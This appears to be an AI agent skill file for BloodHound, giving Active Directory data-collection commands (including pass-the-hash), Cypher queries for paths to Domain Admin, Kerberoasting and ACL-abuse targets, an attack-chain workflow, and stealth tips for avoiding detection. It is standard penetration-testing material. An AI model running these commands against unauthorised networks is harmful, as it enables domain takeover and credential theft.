---
name: bloodhound
description: |
  Active Directory attack path visualization using graph theory. Finds shortest path to Domain Admin,
  identifies Kerberoastable/AS-REP-roastable users, unconstrained delegation, ACL abuses, and lateral
  movement vectors. Use after initial foothold in AD: collect data with SharpHound (Windows) or
  bloodhound-python (Linux/remote), import to BloodHound GUI, run Cypher queries to build attack path.
license: GPL-3.0
compatibility: "Collector: SharpHound on Windows or bloodhound-python (Linux/remote). GUI: BloodHound
  CE via Docker (recommended) or legacy BloodHound + Neo4j. CE available free at bloodhoundenterprise.io."
metadata:
  author: AeonDave
  version: "2.0"
---

# BloodHound

AD attack path mapping via graph analysis — find DA paths, ACL chains, Kerberoast targets, and lateral movement.

---

## Setup: BloodHound CE (Docker — recommended)

```bash
# Pull and start BloodHound CE
curl -L https://ghst.ly/getbhce | docker compose -f - up -d

# Or manual Docker Compose
curl -L https://raw.githubusercontent.com/SpecterOps/BloodHound/main/examples/docker-compose/docker-compose.yml -o docker-compose.yml
docker compose up -d

# Default: http://localhost:8080
# Credentials: printed on first run (check docker logs)
docker compose logs | grep "Initial Password"
```

**BloodHound CE API (for automation):**
```bash
# Get bearer token
TOKEN=$(curl -s -X POST http://localhost:8080/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"login_name":"admin","secret":"INITIAL_PASS"}' | jq -r '.data.session_token')

# Query via API
curl -s http://localhost:8080/api/v2/users -H "Authorization: Bearer $TOKEN" | jq
```

---

## Data Collection

### Option 1: SharpHound (Windows, domain-joined)

```cmd
# Full collection — all data types
SharpHound.exe -c All --outputdirectory C:\Windows\Temp\

# Stealth — DC data only, no session noise
SharpHound.exe -c DCOnly --throttle 2000 --jitter 25

# Explicit credentials (no need for domain-joined)
SharpHound.exe -c All --ldapusername "CORP\user" --ldappassword "pass" --domaincontroller DC_IP

# Target specific domain
SharpHound.exe -c All -d corp.local --domaincontroller 192.168.1.10
```

| Collection type | Data gathered | Noise level |
|----------------|--------------|-------------|
| `DCOnly` | Users, groups, computers, ACLs, trusts, GPOs | Low |
| `Session` | Logged-on sessions (where DA is now) | High |
| `LocalAdmin` | Local group membership on all computers | Medium-High |
| `All` | Everything above | High |

### Option 2: bloodhound-python (Linux/remote — no Windows host needed)

```bash
pip install bloodhound
# or
pipx install bloodhound-python

# Password auth
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP

# Hash (PTH)
bloodhound-python -u user -d DOMAIN.LOCAL --hashes :NTHASH -c ALL -dc DC_IP -ns DC_IP

# Kerberos auth
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP -k

# Collect only specific types (faster)
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c DCOnly,ACL -dc DC_IP -ns DC_IP

# Zip output for import
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP --zip
```

**Tricks:**
- Add DC IP to `/etc/hosts` as the FQDN (`10.0.0.1 dc.corp.local`) to avoid DNS issues
- Use `-c DCOnly` first for stealth; add `Session` only when you need to track DA logins
- `-ns DC_IP` sets nameserver — critical when DNS doesn't resolve domain properly

### Importing Data

```bash
# BloodHound CE: Upload via web UI drag-and-drop at http://localhost:8080
# Or via API:
curl -s -X POST http://localhost:8080/api/v2/file-upload/start \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"expected_file_count":1}' | jq

# Upload zip
curl -X POST "http://localhost:8080/api/v2/file-upload/$UPLOAD_ID" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@20240101_bloodhound.zip"
```

---

## Built-in Queries (GUI)

| Query | What it finds | Use case |
|-------|--------------|---------|
| Shortest Paths to Domain Admins | Any exploitable path to DA | Primary attack chain |
| All Kerberoastable Accounts | SPN users → crack TGS offline | Password cracking |
| AS-REP Roastable Users | Pre-auth disabled users | No-cred roast |
| Principals with DCSync Rights | Replication right holders | Path to cred dump |
| Computers with Unconstrained Delegation | TGT theft targets | Kerberos abuse |
| Shortest Path from Kerberoastable Users | Kerberoast → pivot path | Full chain |
| All DA Group Members | DA enumeration | Situational awareness |
| Find All Paths from Domain Users to DA | Broad attack surface | Initial analysis |

---

## Cypher Query Library

Open the Cypher query console in BloodHound GUI or CE to run these directly.

### Attack Path Discovery

```cypher
// Shortest path from owned user to DA
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p

// All paths from Domain Users to DA (limit depth)
MATCH p=allShortestPaths((g:Group {name:"DOMAIN USERS@CORP.LOCAL"})-[*1..5]->(da:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
RETURN p LIMIT 25

// Paths through specific computer
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(c:Computer {name:"TARGET.CORP.LOCAL"}))
RETURN p
```

### High-Value Target Enumeration

```cypher
// All Kerberoastable users with admin rights
MATCH (u:User {hasspn:true, admincount:true})
RETURN u.name, u.description ORDER BY u.name

// AS-REP roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.description

// Non-admin users with local admin on machines
MATCH (u:User {admincount:false})-[r:AdminTo]->(c:Computer)
RETURN u.name, c.name ORDER BY u.name

// Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true, enabled:true})
WHERE c.name <> "DC.CORP.LOCAL"
RETURN c.name

// Constrained delegation (S4U abuse targets)
MATCH (c:Computer {trustedtoauth:true})
RETURN c.name, c.allowedtodelegate

// Users with constrained delegation
MATCH (u:User {trustedtoauth:true})
RETURN u.name, u.allowedtodelegate
```

### ACL Abuse Discovery

```cypher
// Users with GenericAll on another user (password reset / shadow creds)
MATCH (u1:User)-[r:GenericAll]->(u2:User)
WHERE NOT u1.name STARTS WITH "ADMIN"
RETURN u1.name, u2.name

// GenericWrite on users (targeted Kerberoasting, shadow creds)
MATCH (u:User)-[r:GenericWrite]->(t:User)
RETURN u.name AS attacker, t.name AS target

// WriteDacl on domain object (grant DCSync)
MATCH (u:User)-[r:WriteDacl]->(d:Domain)
RETURN u.name

// AllExtendedRights (includes ForceChangePassword + DCSync)
MATCH (u:User)-[r:AllExtendedRights]->(t)
RETURN u.name, type(t), t.name

// WriteOwner on high-value objects
MATCH (u:User)-[r:WriteOwner]->(t:Group)
WHERE t.admincount = true
RETURN u.name, t.name

// AddMember rights (join high-value groups)
MATCH (u:User)-[r:AddMember]->(g:Group {admincount:true})
RETURN u.name, g.name

// Full ACL attack surface from owned user
MATCH (u:User {owned:true})-[r]->(t)
WHERE type(r) IN ["GenericAll","GenericWrite","WriteDacl","WriteOwner","AllExtendedRights","AddMember","ForceChangePassword"]
RETURN u.name, type(r), labels(t), t.name
```

### Session and Presence

```cypher
// Where are Domain Admins logged in right now?
MATCH (u:User)-[r:HasSession]->(c:Computer)
WHERE u.name IN [(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})<-[m:MemberOf*1..]-(uu:User) | uu.name]
RETURN u.name, c.name

// Computers where owned users have sessions
MATCH (u:User {owned:true})-[r:HasSession]->(c:Computer)
RETURN u.name, c.name

// Find admins logged in to non-DC machines (token theft opportunity)
MATCH (u:User {admincount:true})-[r:HasSession]->(c:Computer)
WHERE NOT c.name CONTAINS "DC"
RETURN u.name, c.name
```

### Trust and Lateral Domain

```cypher
// All domain trusts
MATCH (d1:Domain)-[r:TrustedBy]->(d2:Domain)
RETURN d1.name, type(r), d2.name

// Foreign DA members (cross-domain access)
MATCH (u:User)-[r:MemberOf]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
WHERE NOT u.domain = "CORP.LOCAL"
RETURN u.name, u.domain
```

### Marking Owned Objects

```cypher
// Mark user as owned (after compromise)
MATCH (u:User {name:"TARGETUSER@CORP.LOCAL"})
SET u.owned = true
RETURN u.name

// Mark computer as owned
MATCH (c:Computer {name:"TARGET.CORP.LOCAL"})
SET c.owned = true
RETURN c.name

// Show all owned objects
MATCH (n {owned:true})
RETURN labels(n), n.name
```

---

## Attack Path Workflow

```bash
# 1. Collect data
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -c ALL -dc DC_IP -ns DC_IP --zip

# 2. Import to CE
# Upload .zip at http://localhost:8080

# 3. Mark starting position as owned
# GUI: right-click user → Mark as Owned

# 4. Run: "Shortest Path from Owned Principals"
# OR run Cypher: shortestPath from {owned:true} to DA

# 5. Identify attack edge types in path:
#    HasSession      → token theft
#    AdminTo         → exec/secretsdump
#    GenericAll      → full control
#    WriteDacl       → grant yourself DCSync
#    AddMember       → join privileged group
#    AllExtendedRights → password change / DCSync
#    Kerberoastable  → crack SPN hash

# 6. Execute chain from step 5 using corresponding tools:
#    AdminTo + SMB   → nxc/psexec
#    Kerberoastable  → Rubeus/GetUserSPNs
#    GenericAll user → certipy shadow / forced password reset
#    WriteDacl       → dacledit.py (impacket) → grant DCSync → secretsdump
```

---

## Integration with Other Tools

| BloodHound finding | Tool | Action |
|-------------------|------|--------|
| Kerberoastable users | Rubeus / GetUserSPNs.py | `kerberoast /format:hashcat` |
| AS-REP roastable | Rubeus / GetNPUsers.py | `asreproast /format:hashcat` |
| AdminTo edge | nxc / wmiexec.py | `nxc smb TARGET -u ... --sam` |
| Unconstrained delegation | Rubeus | `monitor` TGTs, then `ptt` |
| GenericWrite on user | certipy | `shadow auto -account TARGET` |
| WriteDacl on domain | dacledit.py | grant DCSync, then secretsdump |
| AddMember on DA group | net rpc / PowerView | add self to Domain Admins |
| ADCS template visible | certipy | `find -vulnerable` → ESC chain |

---

## OPSEC Notes

- `SharpHound -c All` with Session collection triggers LDAP + NetSession queries visible in logs
- `bloodhound-python` from Linux: LDAP queries originating from non-domain-joined host are suspicious
- Use `-c DCOnly --throttle 2000 --jitter 25` for stealth collection — no session query, LDAP throttled
- GUI queries don't touch AD — analysis is local; safe once data is imported
- Marking objects owned only changes local DB, no AD changes
- BloodHound CE runs entirely local — no data leaves your machine

## Resources

| File | When to load |
|------|--------------|
| `references/cypher-queries-and-api.md` | Full Cypher query library, CE API automation, mark-owned workflow, custom analysis patterns, noise reduction strategies |
